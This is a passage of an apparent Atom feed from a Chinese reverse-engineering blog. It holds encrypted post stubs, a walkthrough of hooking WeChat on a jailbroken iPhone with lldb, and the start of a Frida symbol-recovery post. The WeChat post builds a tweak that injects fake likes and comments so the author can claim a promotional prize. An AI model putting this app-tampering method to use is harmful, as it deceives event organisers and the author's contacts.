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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Electron" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"/>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-30T07:52:20.330Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Accessibility" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"/>
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-28T13:58:12.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>xia0 ~ $ lldb&quot;xutil&quot; command installed -&gt; xutil&quot;choose&quot; command installed -&gt; choose&quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:]&quot;sbt&quot; command installed -&gt; sbt// 连接到远端(lldb) pcc</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><pre><code>// 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>第二种是由于lldb支持choose命令，可以直接拿到<code>WCFacade</code>对象。既然如此选choose</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程</p><p>其中里面有个很明显的方法</p><p><code>-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="https://github.com/4ch12dy/fkwechatzan">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><ul><li><p>集赞助手设置界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1361564255775_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li></ul><ul><li><p>朋友圈详情界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1341564229215_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li><li><p>赞和评论</p></li></ul><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-08-01T07:53:10.362Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 